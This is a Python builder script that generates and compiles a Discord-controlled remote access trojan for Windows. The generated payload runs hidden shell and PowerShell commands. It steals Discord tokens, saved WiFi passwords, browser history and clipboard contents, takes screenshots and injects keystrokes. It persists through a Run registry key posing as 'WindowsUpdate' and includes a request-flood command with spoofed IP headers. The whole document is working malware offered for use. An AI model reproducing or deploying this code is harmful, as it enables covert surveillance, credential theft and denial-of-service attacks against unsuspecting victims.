import os
import time
from colorama import init, Fore, Style

os.system("pip install -r requirements.txt")
os.system("cls")

from fade import fire, water, purpleblue

def print_banner():
    banner = """
    ____                           __     ______                    
   / __ \_________    __ __  _____/ /_   /_  __/__  ____ _____ ___   
  / /_/ / ___/ __ \  / / _ \/ ___/ __/    / / / _ \/ __ `/ __ `__ \  
 / ____/ /  / /_/ / / /  __/ /__/ /_     / / /  __/ /_/ / / / / / /  
/_/   /_/   \____/_/ /\___/\___/\__/    /_/  \___/\__,_/_/ /_/ /_/   
                /___/                                                                                   
                                                                      Builder v1.0"""
    
    print()
    faded_banner = water(banner)
    print(faded_banner)

def main():
    init()
    print_banner()
    
    token = input(f"{Fore.GREEN}paste your discord bot token here: {Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}starting building process")
    time.sleep(1)
    
    code = f"""TOKEN = '{token}'\n\n"""

    code = code + r"""import discord, platform, asyncio, tempfile, os, re, subprocess, datetime, ctypes, psutil, sys, winreg, sqlite3, threading, requests, random, time
from discord.ext import commands
from ctypes import windll
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int),
        ('biHeight', ctypes.c_int),
        ('biPlanes', ctypes.c_short),
        ('biBitCount', ctypes.c_short),
        ('biCompression', ctypes.c_uint32),
        ('biSizeImage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_long),
        ('biYPelsPerMeter', ctypes.c_long),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32)
    ]

loop = asyncio.ProactorEventLoop()
asyncio.set_event_loop(loop)

prefix = "$"
intents = discord.Intents.all()

class CustomHelpCommand(commands.HelpCommand):
    async def send_bot_help(self, mapping):
        embed = discord.Embed(
            title="Bot Commands",
            description="Here are all available commands:",
            color=discord.Color.blue()
        )
        
        for cog, commands in mapping.items():
            filtered = await self.filter_commands(commands, sort=True)
            if filtered:
                commands_text = ""
                for cmd in filtered:
                    commands_text += f"`{self.context.clean_prefix}{cmd.name}` - {cmd.brief}\n"
                if commands_text:
                    embed.add_field(
                        name="Commands",
                        value=commands_text,
                        inline=False
                    )
        
        embed.set_footer(text="Use $help <command> for more details about a command.")
        await self.get_destination().send(embed=embed)

    async def send_command_help(self, command):
        embed = discord.Embed(
            title=f"Command: {command.name}",
            description=command.description or command.brief or "No description available.",
            color=discord.Color.green()
        )
        
        if command.aliases:
            embed.add_field(name="Aliases", value=", ".join(command.aliases), inline=False)
        
        usage = f"{self.context.clean_prefix}{command.name}"
        if command.usage:
            usage = command.usage
            
        embed.add_field(name="Usage", value=f"`{usage}`", inline=False)
        await self.get_destination().send(embed=embed)

bot = commands.Bot(
    command_prefix=prefix,
    help_command=CustomHelpCommand(),
    intents=intents
)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=platform.node()))
    print("Ready.")

@bot.command(brief="Gets the computer's IP address.")
async def ip(ctx):
    await send_subprocess(ctx, "curl http://ipinfo.io/ip -s")

@bot.command(brief="Shows a list of all visible networks.")
async def network(ctx):
    await send_subprocess(ctx, "netsh wlan show network")

@bot.command(brief="Gets information about the current user.")
async def user(ctx):
    await send_subprocess(ctx, "net user %username%")

@bot.command(brief="Runs a command or program.")
async def run(ctx, command):
    await send_subprocess(ctx, command)

@bot.command(brief="Runs a PowerShell command.")
async def ps(ctx, command):
    await send_subprocess(ctx, "@PowerShell " + command)

@bot.command(brief="Lists all processes.")
async def tasklist(ctx):
    await send_subprocess(ctx, "tasklist")

@bot.command(brief="Forcefully kills a process.")
async def kill(ctx, process):
    await send_subprocess(ctx, "taskkill /f /im " + process)

@bot.command(brief="Lists files in directory.")
async def tree(ctx, path=os.path.expanduser("~")):
    await send_subprocess(ctx, 'tree /f /a "' + path + '"')

@bot.command(brief="Gets clipboard content.")
async def clipboard(ctx):
    await send_subprocess(ctx, "@PowerShell Get-Clipboard")

@bot.command(brief="Lists connected drives.")
async def drives(ctx):
    await send_subprocess(ctx, "wmic logicaldisk get caption, volumename, freespace, size")

@bot.command(brief="Types text.")
async def type(ctx, *, text):
    escaped_text = text.replace("'", "''")
    command = f'''@PowerShell Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{escaped_text}')'''
    
    await send_subprocess(ctx, command)
    await save_out(ctx, f"Typed: {text}")

@bot.command(brief="Grabs Discord token.")
async def token(ctx):
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }
    msg = ""
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        msg += f"\n{platform}:\n\n"
        tokens = grab_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                msg += f"{token}\n"
        else:
            msg += "No tokens found."
    await save_out(ctx, msg.strip())

@bot.command(brief="Takes a screenshot.", description="Takes a screenshot of the entire screen.")
async def screenshot(ctx):
    ps_script = '''
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save("screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    '''
    
    try:
        script_path = os.path.join(tempfile._get_default_tempdir(), "screenshot.ps1")
        with open(script_path, "w") as f:
            f.write(ps_script)
        
        await send_subprocess(ctx, f'powershell -ExecutionPolicy Bypass -File "{script_path}"')
        
        if os.path.exists("screenshot.png"):
            embed = discord.Embed(
                title="Screenshot",
                description="Screenshot taken at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                color=discord.Color.purple()
            )
            await ctx.send(embed=embed, file=discord.File("screenshot.png"))
            
            os.remove("screenshot.png")
        else:
            await ctx.send("Failed to capture screenshot.")
            
    except Exception as e:
        await ctx.send(f"Error taking screenshot: {str(e)}")
    finally:
        if os.path.exists(script_path):
            os.remove(script_path)

async def send_subprocess(ctx, command):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE

    proc = await asyncio.subprocess.create_subprocess_shell(
        command, 
        stdout=asyncio.subprocess.PIPE, 
        stderr=subprocess.STDOUT,
        startupinfo=startupinfo
    )
    stdout = (await proc.communicate())[0]
    output = stdout.decode(errors="ignore")
    
    embed = discord.Embed(
        title="Command Output",
        description=f"```{output[:2000]}```" if output else "No output",
        color=discord.Color.blue()
    )
    embed.set_footer(text=f"Command: {command}")
    
    if len(output) > 2000:
        filename = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()) + ".txt")
        with open(filename, "w+", encoding="utf-8") as file:
            file.write(output)
        await ctx.send(embed=embed, file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(embed=embed)

async def save_out(ctx, text):
    embed = discord.Embed(
        title="Output",
        description=f"```{text[:2000]}```" if text else "No output",
        color=discord.Color.green()
    )
    
    if len(text) > 2000:
        filename = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()) + ".txt")
        with open(filename, "w+", encoding="utf-8") as file:
            file.write(text)
        await ctx.send(embed=embed, file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(embed=embed)

def grab_tokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

@bot.command(brief="Gets system information.")
async def sysinfo(ctx):
    cpu = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    
    embed = discord.Embed(
        title="System Information",
        color=discord.Color.blue()
    )
    embed.add_field(name="CPU Usage", value=f"{cpu}%", inline=True)
    embed.add_field(name="Memory Usage", value=f"{memory.percent}%", inline=True)
    embed.add_field(name="Disk Usage", value=f"{disk.percent}%", inline=True)
    embed.add_field(name="Boot Time", value=boot_time, inline=False)
    embed.add_field(name="System", value=platform.system(), inline=True)
    embed.add_field(name="Machine", value=platform.machine(), inline=True)
    embed.add_field(name="Node", value=platform.node(), inline=True)
    
    await ctx.send(embed=embed)

@bot.command(brief="Shuts down the computer.")
async def shutdown(ctx):
    await ctx.send("Shutting down...")
    os.system("shutdown /s /t 0")

@bot.command(brief="Restarts the computer.")
async def restart(ctx):
    await ctx.send("Restarting...")
    os.system("shutdown /r /t 0")

@bot.command(brief="Puts computer to sleep.")
async def sleep(ctx):
    await ctx.send("Going to sleep...")
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

@bot.command(brief="Gets active window title.")
async def active_window(ctx):
    await send_subprocess(ctx, '@PowerShell Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Form]::ActiveForm.Text')

@bot.command(brief="Adds program to startup.")
async def startup(ctx, *, path=None):
    if not path:
        path = sys.argv[0]
    
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, "WindowsUpdate", 0, winreg.REG_SZ, path)
        await ctx.send("Added to startup successfully!")
    except Exception as e:
        await ctx.send(f"Error adding to startup: {str(e)}")

@bot.command(brief="Removes program from startup.")
async def remove_startup(ctx):
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.DeleteValue(registry_key, "WindowsUpdate")
        await ctx.send("Removed from startup successfully!")
    except Exception as e:
        await ctx.send(f"Error removing from startup: {str(e)}")

@bot.command(brief="Gets WiFi passwords.")
async def wifi_passwords(ctx):
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp1252', errors='ignore').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        
        embed = discord.Embed(title="WiFi Passwords", color=discord.Color.green())
        
        for profile in profiles:
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                ).decode('cp1252', errors='ignore').split('\n')
                
                password = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                if password:
                    embed.add_field(
                        name=profile,
                        value=f"Password: {password[0]}",
                        inline=False
                    )
            except subprocess.CalledProcessError:
                continue
            except IndexError:
                continue
        
        if len(embed.fields) == 0:
            await ctx.send("No WiFi profiles found.")
        else:
            await ctx.send(embed=embed)
            
    except Exception as e:
        await ctx.send(f"Error retrieving WiFi passwords: {str(e)}")

@bot.command(brief="Gets browser history.")
async def history(ctx):
    try:
        history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
        
        temp_history = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
        os.system(f'copy "{history_path}" "{temp_history}" > nul 2>&1')
        
        conn = sqlite3.connect(temp_history)
        cursor = conn.cursor()
        
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
        results = cursor.fetchall()
        
        history_file = os.path.join(tempfile._get_default_tempdir(), "browser_history.txt")
        with open(history_file, "w", encoding="utf-8") as f:
            f.write("Browser History\n\n")
            for url, title, timestamp in results:
                if title and url:
                    f.write(f"Title: {title}\n")
                    f.write(f"URL: {url}\n")
                    f.write("-" * 50 + "\n")

        conn.close()
        os.remove(temp_history)
        
        await ctx.send(file=discord.File(history_file))
        os.remove(history_file)
        
    except Exception as e:
        await ctx.send(f"Error retrieving browser history: {str(e)}")

@bot.command(brief="Spams requests to a website.", description="Sends multiple requests to a website. Usage: $spam_site <url> <threads> <requests_per_thread> [auth_type] [auth_value]")
async def spam_site(ctx, url: str, threads: int = 10, requests_per_thread: int = 100, auth_type: str = None, auth_value: str = None):
    try:
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            await ctx.send("Invalid URL. Make sure to include http:// or https://")
            return
            
        if threads > 100:
            await ctx.send("Maximum thread count is 100")
            return
            
        if requests_per_thread > 1000:
            await ctx.send("Maximum requests per thread is 1000")
            return

        successful_requests = 0
        failed_requests = 0
        lock = threading.Lock()

        def make_requests(url, count):
            nonlocal successful_requests, failed_requests
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'DNT': '1',
                'Cache-Control': 'max-age=0',
                'Referer': url
            }

            auth = None
            if auth_type and auth_value:
                if auth_type.lower() == 'basic':
                    auth = requests.auth.HTTPBasicAuth(*auth_value.split(':'))
                elif auth_type.lower() == 'bearer':
                    headers['Authorization'] = f'Bearer {auth_value}'
                elif auth_type.lower() == 'apikey':
                    headers['X-API-Key'] = auth_value

            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            session = requests.Session()
            
            for _ in range(count):
                try:
                    if random.choice([True, False]):
                        response = session.get(url, headers=headers, auth=auth, timeout=5, verify=False)
                    else:
                        response = session.post(url, headers=headers, auth=auth, timeout=5, verify=False)
                        
                    with lock:
                        successful_requests += 1
                except:
                    with lock:
                        failed_requests += 1
                
                time.sleep(random.uniform(0.1, 0.3))

        await ctx.send(f"Starting spam attack with {threads} threads, {requests_per_thread} requests per thread...")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for _ in range(threads):
                futures.append(executor.submit(make_requests, url, requests_per_thread))

        embed = discord.Embed(
            title="Spam Attack Results",
            color=discord.Color.green()
        )
        embed.add_field(name="Target URL", value=url, inline=False)
        embed.add_field(name="Total Threads", value=str(threads), inline=True)
        embed.add_field(name="Requests per Thread", value=str(requests_per_thread), inline=True)
        embed.add_field(name="Successful Requests", value=str(successful_requests), inline=True)
        embed.add_field(name="Failed Requests", value=str(failed_requests), inline=True)
        embed.add_field(name="Total Requests", value=str(successful_requests + failed_requests), inline=True)
        if auth_type:
            embed.add_field(name="Authentication", value=auth_type, inline=True)
        
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Error during spam attack: {str(e)}")

bot.run(TOKEN)
"""

    with open("code.py", "w") as file:
        file.write(code)

    os.system("pyinstaller --onefile --noconsole --icon=NONE code.py")

    print(f"\n{Fore.YELLOW}building process finished")
    print(f"{Fore.GREEN}The executable can be found in the 'dist' folder")
    print(f"{Fore.GREEN}You can edit the code in 'code.py'")


if __name__ == "__main__":
    main()
